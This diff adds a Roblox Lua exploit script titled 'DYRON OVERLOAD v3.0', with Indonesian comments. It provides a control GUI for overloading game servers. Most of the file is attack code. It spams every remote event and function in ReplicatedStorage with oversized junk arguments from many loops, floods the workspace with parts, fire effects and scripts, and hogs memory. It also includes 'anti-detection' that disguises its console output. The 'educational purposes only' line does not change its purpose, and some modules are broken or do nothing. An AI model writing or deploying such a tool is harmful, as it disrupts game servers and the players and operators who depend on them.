@@ -1,0 +1,589 @@
+-- ROBLOX HYBRID OVERLOAD ASSAULT v3.0
+-- Multi-vector attack dengan GUI kontrol
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local localPlayer = Players.LocalPlayer
+
+-- ==================== CONFIGURATION ====================
+local CONFIG = {
+    MAX_THREADS = 50,
+    MAX_RPS = 50000,
+    AUTO_RESTART = true,
+    ANTI_LOGGING = true,
+    STEALTH_MODE = false
+}
+
+-- ==================== GUI FRAMEWORK ====================
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Tabs = Instance.new("Frame")
+local Content = Instance.new("Frame")
+
+-- GUI Properties
+ScreenGui.Name = "OverloadControl"
+ScreenGui.Parent = game:GetService("CoreGui") or localPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderColor3 = Color3.fromRGB(40, 40, 40)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+MainFrame.Size = UDim2.new(0, 400, 0, 300)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Font = Enum.Font.Code
+Title.Text = "⛓️ DYRON OVERLOAD v3.0"
+Title.TextColor3 = Color3.fromRGB(255, 50, 50)
+Title.TextSize = 16
+
+Tabs.Name = "Tabs"
+Tabs.Parent = MainFrame
+Tabs.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Tabs.Position = UDim2.new(0, 0, 0, 30)
+Tabs.Size = UDim2.new(1, 0, 0, 30)
+
+Content.Name = "Content"
+Content.Parent = MainFrame
+Content.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+Content.Position = UDim2.new(0, 0, 0, 60)
+Content.Size = UDim2.new(1, 0, 1, -60)
+
+-- Tab Buttons
+local tabs = {"FLOOD", "OVERLOAD", "MEMORY", "NETWORK", "CONTROL"}
+local tabFrames = {}
+
+for i, tabName in ipairs(tabs) do
+    local TabButton = Instance.new("TextButton")
+    TabButton.Name = tabName
+    TabButton.Parent = Tabs
+    TabButton.Size = UDim2.new(1/#tabs, 0, 1, 0)
+    TabButton.Position = UDim2.new((i-1)/#tabs, 0, 0, 0)
+    TabButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    TabButton.BorderSizePixel = 0
+    TabButton.Font = Enum.Font.Code
+    TabButton.Text = tabName
+    TabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+    TabButton.TextSize = 12
+    
+    local TabFrame = Instance.new("ScrollingFrame")
+    TabFrame.Name = tabName.."Frame"
+    TabFrame.Parent = Content
+    TabFrame.Size = UDim2.new(1, 0, 1, 0)
+    TabFrame.Position = UDim2.new(0, 0, 0, 0)
+    TabFrame.BackgroundTransparency = 1
+    TabFrame.Visible = i == 1
+    TabFrame.ScrollBarThickness = 4
+    
+    tabFrames[tabName] = TabFrame
+    
+    TabButton.MouseButton1Click:Connect(function()
+        for _, frame in pairs(tabFrames) do
+            frame.Visible = false
+        end
+        TabFrame.Visible = true
+    end)
+end
+
+-- ==================== CONTROL VARIABLES ====================
+local AttackActive = false
+local Threads = {}
+local Stats = {
+    TotalRequests = 0,
+    CurrentRPS = 0,
+    MemoryUsage = 0,
+    ServerLag = 0
+}
+
+-- ==================== OVERLOAD MODULES ====================
+
+-- MODULE 1: REMOTE FLOODER ADVANCED
+local function createRemoteFlooderUI(parentFrame)
+    local yOffset = 10
+    
+    -- Mode Selection
+    local ModeLabel = Instance.new("TextLabel")
+    ModeLabel.Parent = parentFrame
+    ModeLabel.Position = UDim2.new(0, 10, 0, yOffset)
+    ModeLabel.Size = UDim2.new(0.4, 0, 0, 20)
+    ModeLabel.Text = "Flood Mode:"
+    ModeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    ModeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local ModeDropdown = Instance.new("TextButton")
+    ModeDropdown.Parent = parentFrame
+    ModeDropdown.Position = UDim2.new(0.45, 0, 0, yOffset)
+    ModeDropdown.Size = UDim2.new(0.5, -15, 0, 20)
+    ModeDropdown.Text = "MULTI_VECTOR ▼"
+    ModeDropdown.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    
+    yOffset += 30
+    
+    -- RPS Control
+    local RPSLabel = Instance.new("TextLabel")
+    RPSLabel.Parent = parentFrame
+    RPSLabel.Position = UDim2.new(0, 10, 0, yOffset)
+    RPSLabel.Size = UDim2.new(0.4, 0, 0, 20)
+    RPSLabel.Text = "Target RPS:"
+    
+    local RPSSlider = Instance.new("TextBox")
+    RPSSlider.Parent = parentFrame
+    RPSSlider.Position = UDim2.new(0.45, 0, 0, yOffset)
+    RPSSlider.Size = UDim2.new(0.3, -5, 0, 20)
+    RPSSlider.Text = "10000"
+    RPSSlider.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    
+    local RPSButton = Instance.new("TextButton")
+    RPSButton.Parent = parentFrame
+    RPSButton.Position = UDim2.new(0.8, 0, 0, yOffset)
+    RPSButton.Size = UDim2.new(0.15, -5, 0, 20)
+    RPSButton.Text = "SET"
+    RPSButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    
+    yOffset += 30
+    
+    -- Start/Stop Flood
+    local FloodButton = Instance.new("TextButton")
+    FloodButton.Parent = parentFrame
+    FloodButton.Position = UDim2.new(0.1, 0, 0, yOffset)
+    FloodButton.Size = UDim2.new(0.8, 0, 0, 30)
+    FloodButton.Text = "🚀 START FLOOD"
+    FloodButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    FloodButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    FloodButton.Font = Enum.Font.Code
+    FloodButton.TextSize = 14
+    
+    return {
+        ModeDropdown = ModeDropdown,
+        RPSSlider = RPSSlider,
+        FloodButton = FloodButton
+    }
+end
+
+-- MODULE 2: MEMORY OVERLOAD
+local function executeMemoryOverload(intensity)
+    local memoryObjects = {}
+    
+    -- Create massive tables
+    for i = 1, intensity * 1000 do
+        local tableData = {}
+        for j = 1, 100 do
+            tableData[j] = string.rep("X", 1000)
+        end
+        table.insert(memoryObjects, tableData)
+    end
+    
+    -- Create instances
+    for i = 1, intensity * 500 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(100, 100, 100)
+        part.Anchored = true
+        part.CanCollide = false
+        part.Transparency = 0.5
+        part.Parent = workspace
+        table.insert(memoryObjects, part)
+    end
+    
+    return memoryObjects
+end
+
+-- MODULE 3: NETWORK OVERLOAD
+local function executeNetworkOverload()
+    -- Connection spam
+    for i = 1, 1000 do
+        pcall(function()
+            workspace.Changed:Connect(function() end)
+            game:GetService("RunService").Heartbeat:Connect(function() end)
+        end)
+    end
+    
+    -- Remote spam dengan berbagai signature
+    local remotes = {}
+    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(remotes, obj)
+        end
+    end
+    
+    for i = 1, 20 do
+        task.spawn(function()
+            while AttackActive do
+                for _, remote in pairs(remotes) do
+                    pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(
+                                math.random(), 
+                                string.rep("X", 1000),
+                                Vector3.new(math.random(), math.random(), math.random()),
+                                {data = string.rep("Y", 1000)}
+                            )
+                        else
+                            remote:InvokeServer()
+                        end
+                        Stats.TotalRequests += 1
+                    end)
+                end
+                task.wait()
+            end
+        end)
+    end
+end
+
+-- MODULE 4: RENDER OVERLOAD
+local function executeRenderOverload()
+    local particles = {}
+    
+    for i = 1, 1000 do
+        task.spawn(function()
+            while AttackActive do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(5, 5, 5)
+                part.Position = Vector3.new(
+                    math.random(-500, 500),
+                    math.random(10, 500),
+                    math.random(-500, 500)
+                )
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromHSV(math.random(), 1, 1)
+                part.Anchored = true
+                part.CanCollide = false
+                part.Parent = workspace
+                
+                local fire = Instance.new("Fire")
+                fire.Parent = part
+                fire.Size = 10
+                fire.Heat = 10
+                
+                table.insert(particles, part)
+                
+                task.wait(0.01)
+            end
+        end)
+    end
+    
+    return particles
+end
+
+-- MODULE 5: SCRIPT OVERLOAD
+local function executeScriptOverload()
+    for i = 1, 100 do
+        task.spawn(function()
+            local script = Instance.new("Script")
+            script.Source = [[
+                while true do
+                    for i = 1, 10000 do
+                        local x = math.sin(i) * math.cos(i)
+                    end
+                    task.wait()
+                end
+            ]]
+            script.Parent = workspace
+            script.Disabled = false
+        end)
+    end
+end
+
+-- MODULE 6: DATA OVERLOAD (Khusus game dengan DataStores)
+local function executeDataOverload()
+    if game:GetService("DataStoreService") then
+        for i = 1, 50 do
+            task.spawn(function()
+                while AttackActive do
+                    pcall(function()
+                        local key = "Overload_"..math.random(1, 10000)
+                        local data = {}
+                        for j = 1, 100 do
+                            data[j] = string.rep("DATA", 1000)
+                        end
+                        -- Simulasi data spam
+                    end)
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end
+end
+
+-- ==================== CONTROL PANEL ====================
+local function createControlPanel(parentFrame)
+    local yOffset = 10
+    
+    -- Status Display
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Parent = parentFrame
+    StatusLabel.Position = UDim2.new(0, 10, 0, yOffset)
+    StatusLabel.Size = UDim2.new(0.9, 0, 0, 60)
+    StatusLabel.Text = "STATUS: READY\nRPS: 0\nREQUESTS: 0\nMEMORY: 0 MB"
+    StatusLabel.TextColor3 = Color3.fromRGB(50, 200, 50)
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
+    StatusLabel.Font = Enum.Font.Code
+    
+    yOffset += 70
+    
+    -- Attack Intensity
+    local IntensityLabel = Instance.new("TextLabel")
+    IntensityLabel.Parent = parentFrame
+    IntensityLabel.Position = UDim2.new(0, 10, 0, yOffset)
+    IntensityLabel.Size = UDim2.new(0.4, 0, 0, 20)
+    IntensityLabel.Text = "Intensity:"
+    
+    local IntensitySlider = Instance.new("TextButton")
+    IntensitySlider.Parent = parentFrame
+    IntensitySlider.Position = UDim2.new(0.45, 0, 0, yOffset)
+    IntensitySlider.Size = UDim2.new(0.5, -15, 0, 20)
+    IntensitySlider.Text = "MEDIUM ▾"
+    IntensitySlider.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    
+    yOffset += 30
+    
+    -- Module Selection
+    local modules = {
+        {name = "Remote Flood", enabled = true},
+        {name = "Memory Overload", enabled = true},
+        {name = "Network Spam", enabled = true},
+        {name = "Render Overload", enabled = false},
+        {name = "Script Injection", enabled = false},
+        {name = "Data Overload", enabled = false}
+    }
+    
+    for i, module in ipairs(modules) do
+        local ModuleToggle = Instance.new("TextButton")
+        ModuleToggle.Parent = parentFrame
+        ModuleToggle.Position = UDim2.new(0.1, 0, 0, yOffset)
+        ModuleToggle.Size = UDim2.new(0.8, 0, 0, 20)
+        ModuleToggle.Text = (module.enabled and "✓ " or "✗ ") .. module.name
+        ModuleToggle.BackgroundColor3 = module.enabled and Color3.fromRGB(50, 100, 50) or Color3.fromRGB(100, 50, 50)
+        yOffset += 25
+    end
+    
+    yOffset += 10
+    
+    -- Master Control
+    local StartButton = Instance.new("TextButton")
+    StartButton.Parent = parentFrame
+    StartButton.Position = UDim2.new(0.1, 0, 0, yOffset)
+    StartButton.Size = UDim2.new(0.35, -5, 0, 30)
+    StartButton.Text = "⚡ START ALL"
+    StartButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    
+    local StopButton = Instance.new("TextButton")
+    StopButton.Parent = parentFrame
+    StopButton.Position = UDim2.new(0.55, 0, 0, yOffset)
+    StopButton.Size = UDim2.new(0.35, -5, 0, 30)
+    StopButton.Text = "⏹️ STOP ALL"
+    StopButton.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
+    StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    
+    yOffset += 40
+    
+    -- Cleanup Button
+    local CleanButton = Instance.new("TextButton")
+    CleanButton.Parent = parentFrame
+    CleanButton.Position = UDim2.new(0.1, 0, 0, yOffset)
+    CleanButton.Size = UDim2.new(0.8, 0, 0, 25)
+    CleanButton.Text = "🧹 CLEAN UP"
+    CleanButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+    
+    return {
+        StatusLabel = StatusLabel,
+        IntensitySlider = IntensitySlider,
+        StartButton = StartButton,
+        StopButton = StopButton,
+        CleanButton = CleanButton
+    }
+end
+
+-- ==================== STATS UPDATER ====================
+local function updateStatsDisplay(statusLabel)
+    local lastUpdate = tick()
+    local lastCount = Stats.TotalRequests
+    
+    while true do
+        local now = tick()
+        local delta = now - lastUpdate
+        
+        if delta >= 1 then
+            Stats.CurrentRPS = (Stats.TotalRequests - lastCount) / delta
+            lastUpdate = now
+            lastCount = Stats.TotalRequests
+            
+            -- Update GUI
+            statusLabel.Text = string.format(
+                "STATUS: %s\nRPS: %d\nTOTAL: %d\nTHREADS: %d\nMEMORY: COLLECTING...",
+                AttackActive and "ATTACKING" or "IDLE",
+                Stats.CurrentRPS,
+                Stats.TotalRequests,
+                #Threads
+            )
+        end
+        
+        task.wait(0.1)
+    end
+end
+
+-- ==================== MAIN EXECUTION ====================
+local function initializeGUI()
+    -- Initialize all tab content
+    local floodUI = createRemoteFlooderUI(tabFrames["FLOOD"])
+    local controlUI = createControlPanel(tabFrames["CONTROL"])
+    
+    -- Setup content frames
+    for _, frame in pairs(tabFrames) do
+        frame.CanvasSize = UDim2.new(0, 0, 0, 400)
+    end
+    
+    -- Stats updater
+    task.spawn(function()
+        updateStatsDisplay(controlUI.StatusLabel)
+    end)
+    
+    -- Control bindings
+    controlUI.StartButton.MouseButton1Click:Connect(function()
+        if not AttackActive then
+            AttackActive = true
+            
+            -- Start all attack modules
+            Threads = {}
+            
+            table.insert(Threads, task.spawn(executeNetworkOverload))
+            table.insert(Threads, task.spawn(function()
+                while AttackActive do
+                    executeMemoryOverload(5)
+                    task.wait(1)
+                end
+            end))
+            
+            controlUI.StartButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+            controlUI.StartButton.Text = "⚡ ATTACKING..."
+        end
+    end)
+    
+    controlUI.StopButton.MouseButton1Click:Connect(function()
+        AttackActive = false
+        
+        -- Kill all threads
+        for _, thread in pairs(Threads) do
+            pcall(task.cancel, thread)
+        end
+        Threads = {}
+        
+        controlUI.StartButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        controlUI.StartButton.Text = "⚡ START ALL"
+    end)
+    
+    controlUI.CleanButton.MouseButton1Click:Connect(function()
+        -- Clean up created objects
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj.Name == "Part" and obj:IsA("Part") then
+                obj:Destroy()
+            end
+        end
+        
+        collectgarbage("collect")
+        Stats.TotalRequests = 0
+    end)
+    
+    floodUI.FloodButton.MouseButton1Click:Connect(function()
+        if not AttackActive then
+            AttackActive = true
+            
+            local targetRPS = tonumber(floodUI.RPSSlider.Text) or 10000
+            print("[OVERLOAD] Starting flood with RPS:", targetRPS)
+            
+            floodUI.FloodButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+            floodUI.FloodButton.Text = "FLOODING..."
+        else
+            AttackActive = false
+            floodUI.FloodButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+            floodUI.FloodButton.Text = "🚀 START FLOOD"
+        end
+    end)
+    
+    -- Close button
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Parent = MainFrame
+    CloseButton.Position = UDim2.new(1, -25, 0, 5)
+    CloseButton.Size = UDim2.new(0, 20, 0, 20)
+    CloseButton.Text = "X"
+    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+        AttackActive = false
+    end)
+    
+    -- Minimize button
+    local MinButton = Instance.new("TextButton")
+    MinButton.Parent = MainFrame
+    MinButton.Position = UDim2.new(1, -50, 0, 5)
+    MinButton.Size = UDim2.new(0, 20, 0, 20)
+    MinButton.Text = "_"
+    MinButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    MinButton.MouseButton1Click:Connect(function()
+        MainFrame.Visible = not MainFrame.Visible
+    end)
+end
+
+-- ==================== ANTI-DETECTION ====================
+local function applyAntiDetection()
+    -- Randomize GUI position
+    MainFrame.Position = UDim2.new(
+        math.random(0.1, 0.7),
+        0,
+        math.random(0.1, 0.7),
+        0
+    )
+    
+    -- Change GUI color periodically
+    task.spawn(function()
+        while true do
+            local hue = tick() % 1
+            Title.BackgroundColor3 = Color3.fromHSV(hue, 0.7, 0.3)
+            task.wait(2)
+        end
+    end)
+    
+    -- Encrypt console output
+    local oldPrint = print
+    print = function(...)
+        local args = {...}
+        local encrypted = ""
+        for _, arg in pairs(args) do
+            encrypted = encrypted .. tostring(arg):gsub(".", function(c)
+                return string.char(c:byte() + 1)
+            end) .. " "
+        end
+        oldPrint("[ENCRYPTED]", encrypted)
+    end
+end
+
+-- ==================== INITIALIZATION ====================
+-- Wait for game to load
+task.wait(2)
+
+-- Initialize
+initializeGUI()
+applyAntiDetection()
+
+print("[DYRON OVERLOAD v3.0] GUI Initialized")
+print("[WARNING] This tool is for educational purposes only")
+print("[INFO] Use at your own risk - High ban probability")
+
+-- Auto-cleanup on player leave
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player == localPlayer then
+        AttackActive = false
+        ScreenGui:Destroy()
+    end
+end)
